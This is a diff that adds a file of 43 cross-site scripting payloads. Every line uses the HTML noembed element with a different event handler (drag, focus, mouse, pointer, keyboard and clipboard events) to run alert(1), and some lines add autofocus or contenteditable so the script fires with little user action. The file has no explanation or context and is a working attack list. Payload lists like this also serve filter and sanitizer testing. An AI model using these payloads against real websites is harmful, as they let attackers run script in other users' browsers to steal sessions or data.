@@ -1,0 +1,43 @@
+<noembed draggable="true" ondrag="alert(1)">test</noembed>
+<noembed draggable="true" ondragend="alert(1)">test</noembed>
+<noembed draggable="true" ondragenter="alert(1)">test</noembed>
+<noembed draggable="true" ondragleave="alert(1)">test</noembed>
+<noembed draggable="true" ondragstart="alert(1)">test</noembed>
+<noembed id=x tabindex=1 onactivate=alert(1)></noembed>
+<noembed id=x tabindex=1 onbeforeactivate=alert(1)></noembed>
+<noembed id=x tabindex=1 onbeforedeactivate=alert(1)></noembed><input autofocus>
+<noembed id=x tabindex=1 ondeactivate=alert(1)></noembed><input id=y autofocus>
+<noembed id=x tabindex=1 onfocus=alert(1)></noembed>
+<noembed id=x tabindex=1 onfocusin=alert(1)></noembed>
+<noembed onafterscriptexecute=alert(1)><script>1</script>
+<noembed onbeforecopy="alert(1)" contenteditable>test</noembed>
+<noembed onbeforecut="alert(1)" contenteditable>test</noembed>
+<noembed onbeforepaste="alert(1)" contenteditable>test</noembed>
+<noembed onbeforescriptexecute=alert(1)><script>1</script>
+<noembed onblur=alert(1) tabindex=1 id=x></noembed><input autofocus>
+<noembed onclick="alert(1)">test</noembed>
+<noembed oncontextmenu="alert(1)">test</noembed>
+<noembed oncopy=alert(1) value="XSS" autofocus tabindex=1>test
+<noembed oncut=alert(1) value="XSS" autofocus tabindex=1>test
+<noembed ondblclick="alert(1)" autofocus tabindex=1>test</noembed>
+<noembed onfocusout=alert(1) tabindex=1 id=x></noembed><input autofocus>
+<noembed onkeydown="alert(1)" contenteditable>test</noembed>
+<noembed onkeypress="alert(1)" contenteditable>test</noembed>
+<noembed onkeyup="alert(1)" contenteditable>test</noembed>
+<noembed onmousedown="alert(1)">test</noembed>
+<noembed onmouseenter="alert(1)">test</noembed>
+<noembed onmouseleave="alert(1)">test</noembed>
+<noembed onmousemove="alert(1)">test</noembed>
+<noembed onmouseout="alert(1)">test</noembed>
+<noembed onmouseover="alert(1)">test</noembed>
+<noembed onmouseup="alert(1)">test</noembed>
+<noembed onmousewheel=alert(1)>requires scrolling
+<noembed onpaste="alert(1)" contenteditable>test</noembed>
+<noembed onpointerdown=alert(1)>XSS</noembed>
+<noembed onpointerenter=alert(1)>XSS</noembed>
+<noembed onpointerleave=alert(1)>XSS</noembed>
+<noembed onpointermove=alert(1)>XSS</noembed>
+<noembed onpointerout=alert(1)>XSS</noembed>
+<noembed onpointerover=alert(1)>XSS</noembed>
+<noembed onpointerrawupdate=alert(1)>XSS</noembed>
+<noembed onpointerup=alert(1)>XSS</noembed>
